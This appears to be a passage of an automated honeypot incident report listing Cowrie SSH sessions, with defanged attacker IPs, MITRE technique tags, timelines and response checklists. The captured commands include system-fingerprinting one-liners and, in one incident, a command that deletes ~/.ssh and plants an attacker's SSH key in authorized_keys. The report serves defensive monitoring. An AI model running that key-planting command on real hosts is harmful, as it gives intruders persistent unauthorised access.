| **First Seen** | 2026-08-16 09:06 |
| **Last Seen** | 2026-08-16 09:07 |
| **Session Duration** | 52s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:06:22` | `cowrie.session.connect` |
| `2026-08-16 09:06:28` | `cowrie.client.version` |
| `2026-08-16 09:06:28` | `cowrie.client.kex` |
| `2026-08-16 09:06:53` | `cowrie.login.success` |
| `2026-08-16 09:07:08` | `cowrie.session.params` |
| `2026-08-16 09:07:08` | `cowrie.command.input` |
| `2026-08-16 09:07:15` | `cowrie.log.closed` |
| `2026-08-16 09:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56342b612518

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:14 |
| **Last Seen** | 2026-08-16 09:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:14:24` | `cowrie.session.connect` |
| `2026-08-16 09:14:24` | `cowrie.client.version` |
| `2026-08-16 09:14:24` | `cowrie.client.kex` |
| `2026-08-16 09:14:26` | `cowrie.login.success` |
| `2026-08-16 09:14:28` | `cowrie.session.params` |
| `2026-08-16 09:14:28` | `cowrie.command.input` |
| `2026-08-16 09:14:28` | `cowrie.command.input` |
| `2026-08-16 09:14:28` | `cowrie.command.input` |
| `2026-08-16 09:14:28` | `cowrie.command.input` |
| `2026-08-16 09:14:28` | `cowrie.command.input` |
| `2026-08-16 09:14:28` | `cowrie.command.success` |
| `2026-08-16 09:14:28` | `cowrie.command.input` |
| `2026-08-16 09:14:28` | `cowrie.command.input` |
| `2026-08-16 09:14:28` | `cowrie.command.input` |
| `2026-08-16 09:14:28` | `cowrie.command.input` |
| `2026-08-16 09:14:28` | `cowrie.log.closed` |
| `2026-08-16 09:14:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82836bf5ff28

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 09:15 |
| **Last Seen** | 2026-08-16 09:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:15:28` | `cowrie.session.connect` |
| `2026-08-16 09:15:28` | `cowrie.client.version` |
| `2026-08-16 09:15:28` | `cowrie.client.kex` |
| `2026-08-16 09:15:29` | `cowrie.login.success` |
| `2026-08-16 09:15:30` | `cowrie.session.params` |
| `2026-08-16 09:15:30` | `cowrie.command.input` |
| `2026-08-16 09:15:30` | `cowrie.log.closed` |
| `2026-08-16 09:15:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e2073ca1408

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:16 |
| **Last Seen** | 2026-08-16 09:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:16:10` | `cowrie.session.connect` |
| `2026-08-16 09:16:10` | `cowrie.client.version` |
| `2026-08-16 09:16:10` | `cowrie.client.kex` |
| `2026-08-16 09:16:12` | `cowrie.login.success` |
| `2026-08-16 09:16:14` | `cowrie.session.params` |
| `2026-08-16 09:16:14` | `cowrie.command.input` |
| `2026-08-16 09:16:14` | `cowrie.command.input` |
| `2026-08-16 09:16:14` | `cowrie.command.input` |
| `2026-08-16 09:16:14` | `cowrie.command.input` |
| `2026-08-16 09:16:14` | `cowrie.command.input` |
| `2026-08-16 09:16:14` | `cowrie.command.success` |
| `2026-08-16 09:16:14` | `cowrie.command.input` |
| `2026-08-16 09:16:14` | `cowrie.command.input` |
| `2026-08-16 09:16:14` | `cowrie.command.input` |
| `2026-08-16 09:16:14` | `cowrie.command.input` |
| `2026-08-16 09:16:14` | `cowrie.log.closed` |
| `2026-08-16 09:16:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ceaff165f71

| Field | Detail |
|---|---|
| **Source IP** | `112.161.26[.]125` |
| **First Seen** | 2026-08-16 09:16 |
| **Last Seen** | 2026-08-16 09:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:16:18` | `cowrie.session.connect` |
| `2026-08-16 09:16:19` | `cowrie.client.version` |
| `2026-08-16 09:16:19` | `cowrie.client.kex` |
| `2026-08-16 09:16:21` | `cowrie.login.success` |
| `2026-08-16 09:16:22` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:16:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.161.26[.]125` to AbuseIPDB if not already reported
- [ ] Block `112.161.26[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a03611039d4

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]238` |
| **First Seen** | 2026-08-16 09:16 |
| **Last Seen** | 2026-08-16 09:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:16:28` | `cowrie.session.connect` |
| `2026-08-16 09:16:29` | `cowrie.client.version` |
| `2026-08-16 09:16:29` | `cowrie.client.kex` |
| `2026-08-16 09:16:31` | `cowrie.login.success` |
| `2026-08-16 09:16:32` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:16:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]238` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e526f7068fb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:17 |
| **Last Seen** | 2026-08-16 09:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:17:54` | `cowrie.session.connect` |
| `2026-08-16 09:17:55` | `cowrie.client.version` |
| `2026-08-16 09:17:55` | `cowrie.client.kex` |
| `2026-08-16 09:17:56` | `cowrie.login.success` |
| `2026-08-16 09:17:58` | `cowrie.session.params` |
| `2026-08-16 09:17:58` | `cowrie.command.input` |
| `2026-08-16 09:17:58` | `cowrie.command.input` |
| `2026-08-16 09:17:58` | `cowrie.command.input` |
| `2026-08-16 09:17:58` | `cowrie.command.input` |
| `2026-08-16 09:17:58` | `cowrie.command.input` |
| `2026-08-16 09:17:58` | `cowrie.command.success` |
| `2026-08-16 09:17:58` | `cowrie.command.input` |
| `2026-08-16 09:17:58` | `cowrie.command.input` |
| `2026-08-16 09:17:58` | `cowrie.command.input` |
| `2026-08-16 09:17:58` | `cowrie.command.input` |
| `2026-08-16 09:17:58` | `cowrie.log.closed` |
| `2026-08-16 09:17:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c5cf028e29c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:19 |
| **Last Seen** | 2026-08-16 09:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:19:40` | `cowrie.session.connect` |
| `2026-08-16 09:19:41` | `cowrie.client.version` |
| `2026-08-16 09:19:41` | `cowrie.client.kex` |
| `2026-08-16 09:19:42` | `cowrie.login.success` |
| `2026-08-16 09:19:43` | `cowrie.session.params` |
| `2026-08-16 09:19:43` | `cowrie.command.input` |
| `2026-08-16 09:19:43` | `cowrie.command.input` |
| `2026-08-16 09:19:43` | `cowrie.command.input` |
| `2026-08-16 09:19:43` | `cowrie.command.input` |
| `2026-08-16 09:19:43` | `cowrie.command.input` |
| `2026-08-16 09:19:43` | `cowrie.command.success` |
| `2026-08-16 09:19:43` | `cowrie.command.input` |
| `2026-08-16 09:19:43` | `cowrie.command.input` |
| `2026-08-16 09:19:43` | `cowrie.command.input` |
| `2026-08-16 09:19:43` | `cowrie.command.input` |
| `2026-08-16 09:19:44` | `cowrie.log.closed` |
| `2026-08-16 09:19:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-930c2f273118

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:23 |
| **Last Seen** | 2026-08-16 09:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:23:21` | `cowrie.session.connect` |
| `2026-08-16 09:23:21` | `cowrie.client.version` |
| `2026-08-16 09:23:21` | `cowrie.client.kex` |
| `2026-08-16 09:23:22` | `cowrie.login.success` |
| `2026-08-16 09:23:24` | `cowrie.session.params` |
| `2026-08-16 09:23:24` | `cowrie.command.input` |
| `2026-08-16 09:23:24` | `cowrie.command.input` |
| `2026-08-16 09:23:24` | `cowrie.command.input` |
| `2026-08-16 09:23:24` | `cowrie.command.input` |
| `2026-08-16 09:23:24` | `cowrie.command.input` |
| `2026-08-16 09:23:24` | `cowrie.command.success` |
| `2026-08-16 09:23:24` | `cowrie.command.input` |
| `2026-08-16 09:23:24` | `cowrie.command.input` |
| `2026-08-16 09:23:24` | `cowrie.command.input` |
| `2026-08-16 09:23:24` | `cowrie.command.input` |
| `2026-08-16 09:23:24` | `cowrie.log.closed` |
| `2026-08-16 09:23:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb82ef45830c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:25 |
| **Last Seen** | 2026-08-16 09:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:25:04` | `cowrie.session.connect` |
| `2026-08-16 09:25:04` | `cowrie.client.version` |
| `2026-08-16 09:25:04` | `cowrie.client.kex` |
| `2026-08-16 09:25:05` | `cowrie.login.success` |
| `2026-08-16 09:25:07` | `cowrie.session.params` |
| `2026-08-16 09:25:07` | `cowrie.command.input` |
| `2026-08-16 09:25:07` | `cowrie.command.input` |
| `2026-08-16 09:25:07` | `cowrie.command.input` |
| `2026-08-16 09:25:07` | `cowrie.command.input` |
| `2026-08-16 09:25:07` | `cowrie.command.input` |
| `2026-08-16 09:25:07` | `cowrie.command.success` |
| `2026-08-16 09:25:07` | `cowrie.command.input` |
| `2026-08-16 09:25:07` | `cowrie.command.input` |
| `2026-08-16 09:25:07` | `cowrie.command.input` |
| `2026-08-16 09:25:07` | `cowrie.command.input` |
| `2026-08-16 09:25:08` | `cowrie.log.closed` |
| `2026-08-16 09:25:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d06d4da4ef39

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 09:26 |
| **Last Seen** | 2026-08-16 09:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:26:46` | `cowrie.session.connect` |
| `2026-08-16 09:26:46` | `cowrie.client.version` |
| `2026-08-16 09:26:51` | `cowrie.client.kex` |
| `2026-08-16 09:26:51` | `cowrie.login.success` |
| `2026-08-16 09:26:52` | `cowrie.session.params` |
| `2026-08-16 09:26:52` | `cowrie.command.input` |
| `2026-08-16 09:26:52` | `cowrie.log.closed` |
| `2026-08-16 09:26:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-050b124975b5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:26 |
| **Last Seen** | 2026-08-16 09:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:26:47` | `cowrie.session.connect` |
| `2026-08-16 09:26:47` | `cowrie.client.version` |
| `2026-08-16 09:26:47` | `cowrie.client.kex` |
| `2026-08-16 09:26:48` | `cowrie.login.success` |
| `2026-08-16 09:26:50` | `cowrie.session.params` |
| `2026-08-16 09:26:50` | `cowrie.command.input` |
| `2026-08-16 09:26:50` | `cowrie.command.input` |
| `2026-08-16 09:26:50` | `cowrie.command.input` |
| `2026-08-16 09:26:50` | `cowrie.command.input` |
| `2026-08-16 09:26:50` | `cowrie.command.input` |
| `2026-08-16 09:26:50` | `cowrie.command.success` |
| `2026-08-16 09:26:50` | `cowrie.command.input` |
| `2026-08-16 09:26:50` | `cowrie.command.input` |
| `2026-08-16 09:26:50` | `cowrie.command.input` |
| `2026-08-16 09:26:50` | `cowrie.command.input` |
| `2026-08-16 09:26:53` | `cowrie.log.closed` |
| `2026-08-16 09:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc6d099cc819

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:28 |
| **Last Seen** | 2026-08-16 09:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:28:32` | `cowrie.session.connect` |
| `2026-08-16 09:28:33` | `cowrie.client.version` |
| `2026-08-16 09:28:33` | `cowrie.client.kex` |
| `2026-08-16 09:28:35` | `cowrie.login.success` |
| `2026-08-16 09:28:36` | `cowrie.session.params` |
| `2026-08-16 09:28:36` | `cowrie.command.input` |
| `2026-08-16 09:28:36` | `cowrie.command.input` |
| `2026-08-16 09:28:36` | `cowrie.command.input` |
| `2026-08-16 09:28:36` | `cowrie.command.input` |
| `2026-08-16 09:28:36` | `cowrie.command.input` |
| `2026-08-16 09:28:36` | `cowrie.command.success` |
| `2026-08-16 09:28:36` | `cowrie.command.input` |
| `2026-08-16 09:28:36` | `cowrie.command.input` |
| `2026-08-16 09:28:36` | `cowrie.command.input` |
| `2026-08-16 09:28:36` | `cowrie.command.input` |
| `2026-08-16 09:28:36` | `cowrie.log.closed` |
| `2026-08-16 09:28:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a40f61cc61c

| Field | Detail |
|---|---|
| **Source IP** | `156.236.31[.]85` |
| **First Seen** | 2026-08-16 09:29 |
| **Last Seen** | 2026-08-16 09:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:29:48` | `cowrie.session.connect` |
| `2026-08-16 09:29:48` | `cowrie.client.version` |
| `2026-08-16 09:29:48` | `cowrie.client.kex` |
| `2026-08-16 09:29:49` | `cowrie.login.success` |
| `2026-08-16 09:29:50` | `cowrie.session.params` |
| `2026-08-16 09:29:50` | `cowrie.command.input` |
| `2026-08-16 09:29:50` | `cowrie.command.failed` |
| `2026-08-16 09:29:50` | `cowrie.log.closed` |
| `2026-08-16 09:29:51` | `cowrie.session.params` |
| `2026-08-16 09:29:51` | `cowrie.command.input` |
| `2026-08-16 09:29:51` | `cowrie.session.file_download` |
| `2026-08-16 09:29:51` | `cowrie.log.closed` |
| `2026-08-16 09:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.236.31[.]85` to AbuseIPDB if not already reported
- [ ] Block `156.236.31[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3189159bcac

| Field | Detail |
|---|---|
| **Source IP** | `156.236.31[.]85` |
| **First Seen** | 2026-08-16 09:29 |
| **Last Seen** | 2026-08-16 09:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:29:51` | `cowrie.session.connect` |
| `2026-08-16 09:29:51` | `cowrie.client.version` |
| `2026-08-16 09:29:51` | `cowrie.client.kex` |
| `2026-08-16 09:29:51` | `cowrie.login.success` |
| `2026-08-16 09:29:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.236.31[.]85` to AbuseIPDB if not already reported
- [ ] Block `156.236.31[.]85` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5191ffb62371

| Field | Detail |
|---|---|
| **Source IP** | `156.236.31[.]85` |
| **First Seen** | 2026-08-16 09:29 |
| **Last Seen** | 2026-08-16 09:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:29:51` | `cowrie.session.connect` |
| `2026-08-16 09:29:51` | `cowrie.client.version` |
| `2026-08-16 09:29:52` | `cowrie.client.kex` |
| `2026-08-16 09:29:52` | `cowrie.login.success` |
| `2026-08-16 09:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.236.31[.]85` to AbuseIPDB if not already reported
- [ ] Block `156.236.31[.]85` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d05a343b4c94

| Field | Detail |
|---|---|
